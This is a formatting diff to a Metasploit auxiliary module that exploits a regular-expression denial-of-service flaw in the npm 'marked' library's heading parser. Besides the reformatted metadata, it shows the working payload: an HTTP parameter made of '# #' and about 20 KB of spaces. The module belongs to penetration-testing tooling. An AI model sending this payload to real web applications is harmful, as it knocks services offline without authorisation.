@@ -8,27 +8,28 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'marked npm module "heading" ReDoS',
-      'Description' => %q{
-        This module exploits a Regular Expression Denial of Service vulnerability
-        in the npm module "marked". The vulnerable portion of code that this module
-        targets is in the "heading" regular expression. Web applications that use
-        "marked" for generating html from markdown are vulnerable. Versions up to
-        0.4.0 are vulnerable.
-      },
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'marked npm module "heading" ReDoS',
+        'Description' => %q{
+          This module exploits a Regular Expression Denial of Service vulnerability
+          in the npm module "marked". The vulnerable portion of code that this module
+          targets is in the "heading" regular expression. Web applications that use
+          "marked" for generating html from markdown are vulnerable. Versions up to
+          0.4.0 are vulnerable.
+        },
+        'References' => [
           ['URL', 'https://blog.sonatype.com/cve-2017-17461-vulnerable-or-not'],
           ['CWE', '400']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Adam Cazzolla, Sonatype Security Research',
           'Nick Starke, Sonatype Security Research'
         ],
-      'License'     =>  MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options([
       Opt::RPORT(80),
@@ -54,8 +55,8 @@ class MetasploitModule < Msf::Auxiliary
       params = {
         'uri' => normalize_uri(target_uri.path),
         'method' => datastore['HTTP_METHOD'],
-          ("vars_#{datastore['HTTP_METHOD'].downcase}") => {
-            datastore['HTTP_PARAMETER'] =>  "# #" + (" " * 20 * 1024) + Rex::Text.rand_text_alpha(1)
+        ("vars_#{datastore['HTTP_METHOD'].downcase}") => {
+          datastore['HTTP_PARAMETER'] => "# #" + (" " * 20 * 1024) + Rex::Text.rand_text_alpha(1)
         }
       }
 
